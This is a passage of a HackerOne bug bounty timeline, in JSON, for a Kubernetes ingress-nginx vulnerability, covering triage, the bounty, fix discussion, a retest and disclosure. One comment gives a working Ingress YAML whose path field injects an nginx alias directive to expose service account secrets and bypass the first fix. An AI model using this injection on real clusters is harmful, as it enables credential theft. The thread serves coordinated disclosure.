    {
      "id": 14182523,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @princeofpersia, \n\nAre the commands OK? Is there something missing?",
      "automated_response": false,
      "created_at": "2021-11-04T18:22:52.522Z",
      "updated_at": "2021-11-04T18:22:52.522Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 14325384,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hello @gaffy,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nThanks,\n@princeofpersia",
      "automated_response": false,
      "created_at": "2021-11-16T14:31:50.284Z",
      "updated_at": "2021-11-16T14:31:50.284Z",
      "actor": {
        "username": "h1_analyst_oliver",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_oliver",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/663/153/2664a34113403db9945207030f723e4f93a511b0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 14330538,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2021-11-16T22:09:40.759Z",
      "updated_at": "2021-11-16T22:09:40.759Z",
      "actor": {
        "username": "tallclair",
        "cleared": false,
        "verified": false,
        "url": "/tallclair",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 14786798,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2021-12-23T00:40:39.395Z",
      "updated_at": "2021-12-23T00:40:39.395Z",
      "actor": {
        "url": "/kubernetes",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Kubernetes"
        }
      },
      "bounty_amount": "2500.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "kubernetes",
      "collaborator": {
        "username": "gaffy",
        "url": "/gaffy"
      }
    },
    {
      "id": 14786806,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@gaffy How would you like to be credited (if at all) in the CVE?",
      "automated_response": false,
      "created_at": "2021-12-23T00:44:08.005Z",
      "updated_at": "2021-12-23T00:44:08.005Z",
      "actor": {
        "username": "cjcullen",
        "cleared": false,
        "verified": false,
        "url": "/cjcullen",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 14788261,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for the bounty reward!\nRegarding the CVE, my name is Gafnit Amiga.\n\nI'm really curious about the fix. Is it possible to share some details about it? Thanks",
      "automated_response": false,
      "created_at": "2021-12-23T07:47:04.268Z",
      "updated_at": "2021-12-23T07:47:04.268Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 15615631,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @cjcullen, \nIs there any update about the fix or an estimated timeline?",
      "automated_response": false,
      "created_at": "2022-02-24T12:08:58.297Z",
      "updated_at": "2022-02-24T12:08:58.297Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16580114,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugRetesting",
      "message": "This should now be fixed: https://github.com/kubernetes/ingress-nginx/issues/8502",
      "automated_response": false,
      "created_at": "2022-05-05T18:31:18.567Z",
      "updated_at": "2022-05-05T18:31:18.761Z",
      "actor": {
        "username": "cjcullen",
        "cleared": false,
        "verified": false,
        "url": "/cjcullen",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16589271,
      "is_internal": false,
      "editable": false,
      "type": "Activities::UserCompletedRetest",
      "message": "The fix can be bypassed with the following yaml:\n\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: gaf-ingress\n  annotations:\n    kubernetes.io/ingress.class: \"nginx\"\nspec:\n  rules:\n  -  http:\n      paths:\n        - path: \"/gaf{alias #\\n/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa\"\n          pathType: Prefix\n          backend:\n            service:\n              name: some-service\n              port:\n                number: 5678\n```",
      "automated_response": false,
      "created_at": "2022-05-06T11:44:25.068Z",
      "updated_at": "2022-05-06T11:44:25.068Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16826915,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportRetestApproved",
      "message": null,
      "automated_response": false,
      "created_at": "2022-05-23T23:00:26.283Z",
      "updated_at": "2022-05-23T23:00:26.283Z",
      "actor": {
        "url": "/kubernetes",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Kubernetes"
        }
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16826916,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Revert report state to triaged from retesting",
      "automated_response": false,
      "created_at": "2022-05-23T23:00:26.401Z",
      "updated_at": "2022-05-23T23:00:26.401Z",
      "actor": {
        "username": "cjcullen",
        "cleared": false,
        "verified": false,
        "url": "/cjcullen",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16826931,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for the retest. I'm waiting for the maintainer to repro and propose a fix, but I went ahead and checked the regexes [here](https://github.com/kubernetes/ingress-nginx/blob/main/internal/ingress/inspector/rules.go#L25-L29) and confirmed that they would get tripped up by strings with newlines. Was there anything else missing that you noticed?",
      "automated_response": false,
      "created_at": "2022-05-23T23:04:28.590Z",
      "updated_at": "2022-05-23T23:04:28.590Z",
      "actor": {
        "username": "cjcullen",
        "cleared": false,
        "verified": false,
        "url": "/cjcullen",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16841095,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "No. If newlines will be handled the regex will match it. I also think it will be better to harden the /var/run/secrets regex, because there are many options for paths such as /run/secrets and usage of /./ /../",
      "automated_response": false,
      "created_at": "2022-05-24T19:44:51.878Z",
      "updated_at": "2022-05-24T19:44:51.878Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16964936,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Oh yeah, good point. I'll pass that on to the maintainers for a follow-on fix. If the `alias` directive is blocked, is there any other way to get to /var/run/secrets that you can think of?",
      "automated_response": false,
      "created_at": "2022-06-02T04:12:21.361Z",
      "updated_at": "2022-06-02T04:12:21.361Z",
      "actor": {
        "username": "cjcullen",
        "cleared": false,
        "verified": false,
        "url": "/cjcullen",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16964983,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugRetesting",
      "message": "The additional path you found will be issued another CVE. We believe it is fixed in ingress-nginx [v1.2.1](https://github.com/kubernetes/ingress-nginx/releases/tag/controller-v1.2.1) ([PR](https://github.com/kubernetes/ingress-nginx/pull/8623))",
      "automated_response": false,
      "created_at": "2022-06-02T04:23:27.219Z",
      "updated_at": "2022-06-02T04:23:27.495Z",
      "actor": {
        "username": "cjcullen",
        "cleared": false,
        "verified": false,
        "url": "/cjcullen",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16990750,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @cjcullen,\n\nRetested in v1.2.1.\nPR [#8623](https://github.com/kubernetes/ingress-nginx/pull/8623) does improve the regex and catches new lines.\nPR [#8624](https://github.com/kubernetes/ingress-nginx/pull/8624) successfully removes the alias and root directives.",
      "automated_response": false,
      "created_at": "2022-06-04T10:01:55.679Z",
      "updated_at": "2022-06-04T10:01:55.679Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 16995406,
      "is_internal": false,
      "editable": false,
      "type": "Activities::RetestUserExpired",
      "message": "",
      "automated_response": false,
      "created_at": "2022-06-05T04:55:08.310Z",
      "updated_at": "2022-06-05T04:55:08.310Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 17009242,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ExternalUserJoined",
      "message": "",
      "automated_response": false,
      "created_at": "2022-06-06T13:34:19.131Z",
      "updated_at": "2022-06-06T13:34:19.131Z",
      "additional_data": {
        "report_permissions": null,
        "report_retest_user_id": 22159
      },
      "actor": {
        "username": "daryan-kurd",
        "cleared": false,
        "verified": false,
        "url": "/daryan-kurd",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/n478ae3q52a06ebrzydld5qiu59r/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 17012791,
      "is_internal": false,
      "editable": false,
      "type": "Activities::UserCompletedRetest",
      "message": "I read this report and followed the steps for reproducing the bug in v1.2.1. But as @gaffy mentioned in her last comment, the two PRs fix the bug. (https://github.com/kubernetes/ingress-nginx/pull/8623 and https://github.com/kubernetes/ingress-nginx/pull/8624)",
      "automated_response": false,
      "created_at": "2022-06-06T18:54:58.061Z",
      "updated_at": "2022-06-06T18:54:58.061Z",
      "actor": {
        "username": "daryan-kurd",
        "cleared": false,
        "verified": false,
        "url": "/daryan-kurd",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/n478ae3q52a06ebrzydld5qiu59r/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 17385452,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ExternalUserRemoved",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-02T05:32:46.240Z",
      "updated_at": "2022-07-02T05:32:46.240Z",
      "actor": {
        "username": "daryan-kurd",
        "cleared": false,
        "verified": false,
        "url": "/daryan-kurd",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/n478ae3q52a06ebrzydld5qiu59r/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "removed_user": {
        "url": "/daryan-kurd",
        "username": "daryan-kurd"
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 17561509,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportRetestApproved",
      "message": null,
      "automated_response": false,
      "created_at": "2022-07-14T18:09:49.916Z",
      "updated_at": "2022-07-14T18:09:49.916Z",
      "actor": {
        "url": "/kubernetes",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Kubernetes"
        }
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 17561510,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-14T18:09:50.027Z",
      "updated_at": "2022-07-14T18:09:50.027Z",
      "actor": {
        "username": "tallclair",
        "cleared": false,
        "verified": false,
        "url": "/tallclair",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "gaffy",
        "url": "/gaffy"
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 17561516,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-14T18:10:53.332Z",
      "updated_at": "2022-07-14T18:10:53.332Z",
      "first_to_agree": true,
      "actor": {
        "username": "tallclair",
        "cleared": false,
        "verified": false,
        "url": "/tallclair",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 17873124,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-08-06T07:14:09.029Z",
      "updated_at": "2022-08-06T07:14:09.029Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 17873125,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-08-06T07:14:09.151Z",
      "updated_at": "2022-08-06T07:14:09.151Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}